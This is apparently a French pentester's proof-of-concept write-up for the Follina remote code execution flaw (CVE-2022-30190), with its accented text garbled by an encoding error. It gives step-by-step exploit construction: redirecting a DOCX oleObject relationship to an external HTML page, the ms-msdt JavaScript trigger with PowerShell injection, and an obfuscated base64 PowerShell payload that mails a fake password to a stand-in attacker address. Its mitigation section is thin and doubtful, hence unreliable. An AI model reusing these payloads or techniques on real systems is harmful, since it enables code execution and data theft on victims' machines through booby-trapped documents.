Le CVE-2022-30190 est une RCE qui permet a un fichier DOCX de lancer des commande de type POWERSHELL, JS, VBA...

Dans la POC qui va suivre un mail est g√©n√©r√© par l‚Äôexploit & une boite de diabogue powershell apparait, cela permet de ce rendre compte que il est possible de faire ce que l‚Äôon veux.

Voici une POC vid√©o de l‚Äôexploit (**no weaponized**) :

[POC - Follina.mp4](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c44b9237-f98e-4a55-82f1-2d944c7867e3/POC_-_Follina.mp4)

# D√©roulement de l‚Äôexploit

Quand le document DOCX est ouvert une suite d‚Äôaction est √©ffectu√©e :

- Ouverture du DOCX
- Le fichier ‚Äúdocument.xml.rels‚Äù qui est un fichier n√©cessaire au fonctionnement des fichier DOCX pointe vers une page HTML (modification du type oleObject avec le lien vers la page HTML)
- Le lien HTML est ouvert (dans le navigateur par d√©faut)
- Le JS dans la page HTML contient un ‚Äúlocation.href‚Äù qui ouvre l‚Äôassistant d√©pannage de diagnostic en incluant le payload (commandes powershell‚Ä¶)
- Les commandes sont ex√©cut√©es sur le PC

# POC

Installer les fichiers requis :

- python & python3
- fichiers du CVE-2021-40444

Installation :

- pip install virtualenv
- python -m virtualenv venv
- pip install -r requirements.txt

Lancement & cr√©ation de l‚Äôexploit (avec un g√©n√©rateur):

- venv\Scripts\activate.bat
- python [generator.py](http://generator.py/) -u [h](http://127.0.0.1/)ttp://lien_vers_lexploit_html -P lien_des_executables --no-cab --host --convert
    
    <aside>
    üí° Penser √† host le fichier HTML pour que l‚Äôexploit marche (le fichier est host automatiquement en local avec la POC disponible [ici](https://sam.nl.tab.digital/s/FTJATf3opFd2NsM))
    
    </aside>
    

Pour le faire sans le g√©n√©rateur il suffit de modifier le document.xml.rels contenus dans le fichier DOCX:
Comme dans l‚Äôexemple ici, change la target de oleObject pour pointer sur la page HTML

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="**http://guilhemguilhem.github.io/PENTEST-RESEARCH/POC.html!**" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.wmf"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.jpeg"/></Relationships>
```

Ici un exemple du JS √† inclure dans la page pour l‚Äôexploit:

```jsx
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../../../../../../../../../../../$(**POWERSHELL PAYLOAD**)/.exe\"";
```

Afin de rendre le payload plus facilement √©x√©cutable par le PC et ainsi faire des payloads plus lourd et ‚Äúweaponized‚Äù j‚Äôai encod√© le payload en base64 (Il a aussi donc fallut que je change le code):

```jsx
IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'W1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZFdpdGhQYXJ0aWFsTmFtZSgiU3lzdGVtLldpbmRvd3MuRm9ybXMiKTtbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveF06OlNob3coIkNPVUNPVSIsIkhBSEFIQSIsMSk7U3RhcnQtUHJvY2VzcyAoIm1haWx0bzpldmlsbWFpbEBoYWNrZXJtYW4uY29tP1N1YmplY3Q9RW1haWwgbGVhayBtb3QgZGUgcGFzc2UmQ2M9ZGh1YjAyQGRvbWFpbi50bGQmQm9keT1tZHAxMjMxMjMiKQ=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
```

# R√©solution & Protection

Passer de Office 2016 √† une version sup√©rieure permet d‚Äôempecher l‚Äôexploit.

Une GPO peux aussi le faire [PISTE A CREUSER]
